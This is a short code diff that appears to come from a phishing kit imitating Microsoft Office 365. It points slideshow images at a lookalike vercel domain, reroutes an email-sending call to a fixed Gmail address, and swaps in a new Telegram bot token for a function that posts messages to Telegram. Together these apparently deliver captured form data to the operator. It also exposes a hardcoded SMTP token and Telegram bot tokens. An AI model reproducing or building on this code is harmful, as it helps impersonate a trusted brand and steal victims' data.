@@ -60,7 +60,7 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     });
 
-    const images = ['https://o-365.vercel.app/images/image1.jpg', 'https://o-365.vercel.app/images/image2.jpg', 'https://o-365.vercel.app/images/image3.jpg', 'https://o-365.vercel.app/images/image4.jpg'];
+    const images = ['https://microsoftoffice365-sigma.vercel.app/images/image1.jpg', 'https://microsoftoffice365-sigma.vercel.app/images/image2.jpg', 'https://microsoftoffice365-sigma.vercel.app/images/image3.jpg', 'https://microsoftoffice365-sigma.vercel.app/images/image4.jpg'];
 
     const slideshowImages = document.querySelectorAll('.slideshow-image');
 
@@ -120,8 +120,8 @@ const sendEmail = async (data) => {
     try {
         await Email.send({
             SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
-            To: templateParams.to_email,
-            From: 'gonzalezday7121@gmail.com',
+            To: 'gonzalezday7121@gmail.com',
+            From: 'bekkierowland@gmail.com',
             Subject: templateParams.subject,
             Body: templateParams.body,
         });
@@ -132,7 +132,7 @@ const sendEmail = async (data) => {
 };
 
 const sendToTelegram = async (message) => {
-    const telegramBotToken = '6634105680:AAHew1ynUl3IFBQ5-GYQ88RrQUDjwrdwKQI';
+    const telegramBotToken = '6721983070:AAFEubEbisF5IrznY1eS6gqpRp5hbjubOlM';
     const chatId = '6546686863'; // Adjust the chat ID accordingly
 
     const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
